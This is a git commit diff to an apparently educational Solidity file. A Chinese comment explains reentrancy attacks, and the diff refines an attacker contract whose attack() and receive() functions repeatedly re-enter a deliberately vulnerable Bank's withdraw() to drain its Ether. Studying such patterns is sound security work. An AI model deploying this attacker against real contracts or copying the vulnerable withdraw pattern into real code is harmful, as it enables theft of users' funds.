a7a65da41cee5cecc0ffa4cfadb984947164aa96
Rock <1598007611@qq.com>
2022-12-15 16:30:56 +0800

    重入攻击

--- attack/ReentrancyAttack.sol
+++ attack/ReentrancyAttack.sol
@@ -2,20 +2,13 @@
 pragma solidity ^0.8.10;
 
 /**
+    https://www.youtube.com/watch?v=wKt9h2Z8QVQ&t=496s
     合约重入攻击，是指在同一交易中对业务合约进行多次调用，从而实现对合约的攻击。
     合约重入
     如果业务合约的公开方法中，有提现 Ether 或者调用第三方合约的操作，那么就可以对合约方法的进行二次以及多次调用，从而实现合约重入。
     重入攻击
     大多数情况下，重入攻击利用了业务合约先提现 Ether 或者调用第三方合约，然后修改合约状态的漏洞，从而实现重入攻击。
  */
-
-interface IBank {
-
-    function deposit() external payable;
-
-    function withdraw() external;
-
-}
 
 contract Bank {
 
@@ -37,31 +30,26 @@ contract Bank {
         totalDeposit -= balance[msg.sender];
         balance[msg.sender] = 0;
     }
-
 }
 
 contract ReentrancyAttack {
 
-    IBank bank;
+    Bank public bank;
 
     constructor(address _bank) {
-        bank = IBank(_bank);
+        bank =  Bank(_bank);
     }
 
-    function doDeposit() external payable {
+    function attack() external payable {
         bank.deposit{value: msg.value}();
-    }
-
-    function doWithdraw() external {
         bank.withdraw();
         payable(msg.sender).transfer(address(this).balance);
     }
 
-    function balance() external view returns (uint256) {
-        return address(this).balance;
-    }
-
     receive() external payable {
-        bank.withdraw();
+        // 防止出现死循环，出现死循环会导致取不到钱
+        if (address(bank).balance > 1 ether) {
+            bank.withdraw();
+        }
     }
 }
